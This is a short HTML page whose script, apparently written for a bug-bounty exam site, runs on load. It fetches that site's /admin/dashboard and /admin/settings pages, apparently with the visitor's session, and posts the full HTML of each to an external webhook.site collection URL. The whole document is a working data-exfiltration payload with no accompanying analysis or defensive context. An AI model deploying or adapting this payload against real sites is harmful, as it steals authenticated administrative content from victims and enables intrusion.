<!DOCTYPE html>
<html>
<body>
    <script>
        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
        
        // 1. Try to find the Flag on the Admin Dashboard
        // We fetch the HTML of the admin page, not the API
        fetch("https://bugbounty-exam.hashacademy.co/admin/dashboard")
            .then(r => r.text())
            .then(html => {
                fetch(webhook, {
                    method: "POST",
                    mode: "no-cors",
                    body: "DASHBOARD_HTML: " + html
                });
            });

        // 2. Try to find a "Messages" or "Settings" page
        fetch("https://bugbounty-exam.hashacademy.co/admin/settings")
            .then(r => r.text())
            .then(html => {
                fetch(webhook, {
                    method: "POST",
                    mode: "no-cors",
                    body: "SETTINGS_HTML: " + html
                });
            });
    </script>
</body>
</html>
